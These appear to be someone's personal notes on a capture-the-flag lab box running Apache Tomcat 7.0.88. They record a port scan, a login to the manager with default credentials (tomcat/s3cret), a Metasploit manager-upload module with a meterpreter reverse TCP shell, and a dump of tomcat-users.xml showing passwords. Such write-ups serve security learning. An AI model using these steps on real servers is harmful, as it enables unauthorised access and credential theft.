10.129.114.119 

# open ports
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1


# 80 
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88

* http://10.129.114.119:8080/manager/html =>  standard pw: tomcat / s3cret

# Server info
Apache Tomcat/7.0.88 	1.8.0_171-b11 	Oracle Corporation 	Windows Server 2012 R2 	6.3 	amd64 	JERRY 	10.129.114.119


* Related to tomcat: https://www.cvedetails.com/cve/CVE-2019-0232/

# Used metasploit

* use multi/http/tomcat_mgr_upload
* use payload windows/meterpreter/reverse_tcp


meterpreter > cat tomcat-users.xml
<?xml version='1.0' encoding='utf-8'?>
<tomcat-users>
  <role rolename="tomcat"/>
  <role rolename="role1"/>
  <user username="tomcat" password="s3cret" roles="tomcat, manager-gui, manager-script, manager-jmx, manager-status"/>
  <user username="admin" password="admin" roles="role1, manager-status"/>
  <user username="jerry" password="tomcat" roles="role1, manager-status"/>


=> cd to C:/Windows/Users and bam